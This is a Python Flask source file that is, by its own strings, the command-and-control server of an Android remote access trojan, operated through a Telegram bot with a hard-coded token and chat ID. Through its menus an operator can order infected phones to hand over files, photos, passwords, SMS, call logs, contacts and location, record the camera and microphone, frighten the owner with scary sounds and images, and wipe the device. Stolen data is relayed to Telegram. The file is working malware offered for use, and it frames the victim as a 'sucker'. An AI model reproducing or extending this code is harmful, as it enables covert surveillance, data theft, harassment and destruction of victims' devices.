import os
import time
import threading
import requests
import json
import base64
from flask import Flask, request, jsonify

app = Flask(__name__)

BOT_TOKEN = '7798641801:AAHZWpVGv2YicowZaigNS9Q7jIHu9S3Jxaw'
CHAT_ID = '7803661441'

latest_command = {"cmd": "none", "params": ""}

print("✅ Лох попался", flush=True)

# ========== ОТПРАВКА СООБЩЕНИЙ ==========
def send_telegram(text, buttons=None):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {'chat_id': CHAT_ID, 'text': text}
        if buttons:
            data['reply_markup'] = json.dumps(buttons)
        requests.post(url, data=data, timeout=5)
    except:
        pass

# ========== ГЛАВНОЕ МЕНЮ ==========
def main_menu():
    keyboard = {
        "inline_keyboard": [
            [{"text": "📁 ФАЙЛЫ", "callback_data": "files"}],
            [{"text": "📸 ГАЛЕРЕЯ", "callback_data": "gallery"}],
            [{"text": "🔑 ПАРОЛИ", "callback_data": "passwords"}],
            [{"text": "📝 ЗАМЕТКИ", "callback_data": "notes"}],
            [{"text": "🎥 КАМЕРА", "callback_data": "camera"}],
            [{"text": "🎙️ МИКРОФОН", "callback_data": "mic"}],
            [{"text": "🔊 СТРАШНЫЕ ЗВУКИ", "callback_data": "sounds"}],
            [{"text": "😱 УСТРАШЕНИЕ", "callback_data": "scary"}],
            [{"text": "📍 ЛОКАЦИЯ", "callback_data": "location"}],
            [{"text": "💬 СМС", "callback_data": "sms"}],
            [{"text": "📞 ЗВОНКИ", "callback_data": "calls"}],
            [{"text": "👥 КОНТАКТЫ", "callback_data": "contacts"}],
            [{"text": "💀 УНИЧТОЖЕНИЕ", "callback_data": "wipe"}],
            [{"text": "⚙️ ДРУГИЕ", "callback_data": "other"}]
        ]
    }
    return keyboard

# ========== МЕНЮ ФАЙЛОВ ==========
def files_menu():
    return {
        "inline_keyboard": [
            [{"text": "📂 /sdcard", "callback_data": "files_sdcard"}],
            [{"text": "📂 DCIM", "callback_data": "files_dcim"}],
            [{"text": "📂 Download", "callback_data": "files_download"}],
            [{"text": "📂 Documents", "callback_data": "files_documents"}],
            [{"text": "◀️ НАЗАД", "callback_data": "back"}]
        ]
    }

def camera_menu():
    return {
        "inline_keyboard": [
            [{"text": "📸 ФРОНТАЛЬНАЯ", "callback_data": "photo_front"}],
            [{"text": "📷 ОСНОВНАЯ", "callback_data": "photo_back"}],
            [{"text": "◀️ НАЗАД", "callback_data": "back"}]
        ]
    }

def mic_menu():
    return {
        "inline_keyboard": [
            [{"text": "🎙️ 5 СЕК", "callback_data": "audio_5"}],
            [{"text": "🎙️ 10 СЕК", "callback_data": "audio_10"}],
            [{"text": "🎙️ 30 СЕК", "callback_data": "audio_30"}],
            [{"text": "◀️ НАЗАД", "callback_data": "back"}]
        ]
    }

def sounds_menu():
    return {
        "inline_keyboard": [
            [{"text": "🔊 СИРЕНА", "callback_data": "sound_siren"}],
            [{"text": "👻 СТРАШНЫЙ ЗВУК", "callback_data": "sound_scary"}],
            [{"text": "🎵 RICKROLL", "callback_data": "sound_rickroll"}],
            [{"text": "🔔 УВЕДОМЛЕНИЕ", "callback_data": "sound_notify"}],
            [{"text": "◀️ НАЗАД", "callback_data": "back"}]
        ]
    }

def scary_menu():
    return {
        "inline_keyboard": [
            [{"text": "👻 СТРАШНАЯ КАРТИНКА", "callback_data": "scary_image"}],
            [{"text": "📺 СТРАШНОЕ ВИДЕО", "callback_data": "scary_video"}],
            [{"text": "🔊 ВЗРЫВ", "callback_data": "scary_explosion"}],
            [{"text": "💀 СООБЩЕНИЕ", "callback_data": "scary_death"}],
            [{"text": "🕷️ ПАУК", "callback_data": "scary_spider"}],
            [{"text": "◀️ НАЗАД", "callback_data": "back"}]
        ]
    }

def other_menu():
    return {
        "inline_keyboard": [
            [{"text": "🔋 УРОВЕНЬ ЗАРЯДА", "callback_data": "battery"}],
            [{"text": "🌐 IP АДРЕС", "callback_data": "ip"}],
            [{"text": "📱 МОДЕЛЬ", "callback_data": "device_info"}],
            [{"text": "📡 ОТКРЫТЬ САЙТ", "callback_data": "open_url"}],
            [{"text": "📢 СКАЗАТЬ ТЕКСТ", "callback_data": "say_text"}],
            [{"text": "◀️ НАЗАД", "callback_data": "back"}]
        ]
    }

# ========== ОБРАБОТКА КОМАНД ==========
def handle_update(update):
    global latest_command
    
    if 'callback_query' in update:
        data = update['callback_query']['data']
        
        if data == 'back':
            send_telegram("🤖 ГЛАВНОЕ МЕНЮ", main_menu())
        
        elif data == 'files':
            send_telegram("📁 ВЫБЕРИТЕ ПАПКУ", files_menu())
        elif data == 'camera':
            send_telegram("📸 ВЫБЕРИТЕ КАМЕРУ", camera_menu())
        elif data == 'mic':
            send_telegram("🎙️ ВЫБЕРИТЕ ДЛИТЕЛЬНОСТЬ", mic_menu())
        elif data == 'sounds':
            send_telegram("🔊 ВЫБЕРИТЕ ЗВУК", sounds_menu())
        elif data == 'scary':
            send_telegram("👻 СТРАШНЫЕ ЭФФЕКТЫ", scary_menu())
        elif data == 'other':
            send_telegram("⚙️ ДРУГИЕ ФУНКЦИИ", other_menu())
        
        # Команды
        elif data == 'files_sdcard':
            latest_command = {"cmd": "files", "params": "/sdcard"}
            send_telegram("✅ ОТПРАВЛЕНО", main_menu())
        elif data == 'files_dcim':
            latest_command = {"cmd": "files", "params": "/sdcard/DCIM"}
            send_telegram("✅ ОТПРАВЛЕНО", main_menu())
        elif data == 'files_download':
            latest_command = {"cmd": "files", "params": "/sdcard/Download"}
            send_telegram("✅ ОТПРАВЛЕНО", main_menu())
        elif data == 'files_documents':
            latest_command = {"cmd": "files", "params": "/sdcard/Documents"}
            send_telegram("✅ ОТПРАВЛЕНО", main_menu())
        
        elif data == 'photo_front':
            latest_command = {"cmd": "photo", "params": "front"}
            send_telegram("✅ ФОТО ЗАПРОШЕНО", main_menu())
        elif data == 'photo_back':
            latest_command = {"cmd": "photo", "params": "back"}
            send_telegram("✅ ФОТО ЗАПРОШЕНО", main_menu())
        
        elif data == 'audio_5':
            latest_command = {"cmd": "audio", "params": "5"}
            send_telegram("🎙️ ЗАПИСЬ 5 СЕК", main_menu())
        elif data == 'audio_10':
            latest_command = {"cmd": "audio", "params": "10"}
            send_telegram("🎙️ ЗАПИСЬ 10 СЕК", main_menu())
        elif data == 'audio_30':
            latest_command = {"cmd": "audio", "params": "30"}
            send_telegram("🎙️ ЗАПИСЬ 30 СЕК", main_menu())
        
        elif data == 'sound_siren':
            latest_command = {"cmd": "sound", "params": "siren"}
            send_telegram("🔊 СИРЕНА", main_menu())
        elif data == 'sound_scary':
            latest_command = {"cmd": "sound", "params": "scary"}
            send_telegram("👻 СТРАШНЫЙ ЗВУК", main_menu())
        elif data == 'sound_rickroll':
            latest_command = {"cmd": "sound", "params": "rickroll"}
            send_telegram("🎵 RICKROLL", main_menu())
        elif data == 'sound_notify':
            latest_command = {"cmd": "sound", "params": "notify"}
            send_telegram("🔔 УВЕДОМЛЕНИЕ", main_menu())
        
        elif data == 'scary_image':
            latest_command = {"cmd": "scary", "params": "image"}
            send_telegram("👻 СТРАШНАЯ КАРТИНКА", main_menu())
        elif data == 'scary_video':
            latest_command = {"cmd": "scary", "params": "video"}
            send_telegram("📺 СТРАШНОЕ ВИДЕО", main_menu())
        elif data == 'scary_explosion':
            latest_command = {"cmd": "scary", "params": "explosion"}
            send_telegram("💥 ВЗРЫВ", main_menu())
        elif data == 'scary_death':
            latest_command = {"cmd": "scary", "params": "death"}
            send_telegram("💀 СООБЩЕНИЕ", main_menu())
        elif data == 'scary_spider':
            latest_command = {"cmd": "scary", "params": "spider"}
            send_telegram("🕷️ ПАУК", main_menu())
        
        elif data == 'gallery':
            latest_command = {"cmd": "gallery", "params": ""}
            send_telegram("📸 ГАЛЕРЕЯ", main_menu())
        elif data == 'passwords':
            latest_command = {"cmd": "passwords", "params": ""}
            send_telegram("🔑 ПАРОЛИ", main_menu())
        elif data == 'notes':
            latest_command = {"cmd": "notes", "params": ""}
            send_telegram("📝 ЗАМЕТКИ", main_menu())
        elif data == 'location':
            latest_command = {"cmd": "location", "params": ""}
            send_telegram("📍 ЛОКАЦИЯ", main_menu())
        elif data == 'sms':
            latest_command = {"cmd": "sms", "params": ""}
            send_telegram("💬 СМС", main_menu())
        elif data == 'calls':
            latest_command = {"cmd": "calls", "params": ""}
            send_telegram("📞 ЗВОНКИ", main_menu())
        elif data == 'contacts':
            latest_command = {"cmd": "contacts", "params": ""}
            send_telegram("👥 КОНТАКТЫ", main_menu())
        
        elif data == 'battery':
            latest_command = {"cmd": "battery", "params": ""}
            send_telegram("🔋 УРОВЕНЬ ЗАРЯДА", main_menu())
        elif data == 'ip':
            latest_command = {"cmd": "ip", "params": ""}
            send_telegram("🌐 IP", main_menu())
        elif data == 'device_info':
            latest_command = {"cmd": "device_info", "params": ""}
            send_telegram("📱 МОДЕЛЬ", main_menu())
        elif data == 'open_url':
            latest_command = {"cmd": "open_url", "params": ""}
            send_telegram("📡 ОТКРЫТЬ САЙТ", main_menu())
        elif data == 'say_text':
            latest_command = {"cmd": "say_text", "params": ""}
            send_telegram("📢 СКАЗАТЬ ТЕКСТ", main_menu())
        
        elif data == 'wipe':
            latest_command = {"cmd": "wipe", "params": ""}
            send_telegram("💀 УНИЧТОЖЕНИЕ ТЕЛЕФОНА", main_menu())
    
    elif 'message' in update:
        text = update['message'].get('text', '')
        if text == '/start':
            send_telegram("🤖 ANDROID RAT АКТИВИРОВАН\n\n👇 Используйте кнопки", main_menu())
        elif text == '/menu':
            send_telegram("🤖 ГЛАВНОЕ МЕНЮ", main_menu())

# ========== СЛУШАТЕЛЬ ==========
def listen():
    last_id = 0
    send_telegram("✅ RAT СЕРВЕР ЗАПУЩЕН!")
    while True:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
            params = {'offset': last_id + 1, 'timeout': 10}
            r = requests.get(url, params=params, timeout=15).json()
            if r.get('ok'):
                for update in r['result']:
                    last_id = update['update_id']
                    handle_update(update)
        except Exception as e:
            print(f"Ошибка: {e}", flush=True)
        time.sleep(1)

threading.Thread(target=listen, daemon=True).start()

# ========== API ДЛЯ ANDROID ==========
@app.route('/')
def home():
    return "✅ RAT сервер работает!", 200

@app.route('/get_command', methods=['GET'])
def get_command():
    cmd = latest_command["cmd"]
    params = latest_command["params"]
    if cmd != "none":
        latest_command["cmd"] = "none"
        latest_command["params"] = ""
    return jsonify({"command": cmd, "params": params})

@app.route('/send_data', methods=['POST'])
def send_data():
    data = request.get_json()
    if data:
        msg_type = data.get('type', 'data')
        content = data.get('content', '')
        send_telegram(f"📱 {msg_type.upper()}:\n{content[:3000]}")
    return "OK", 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
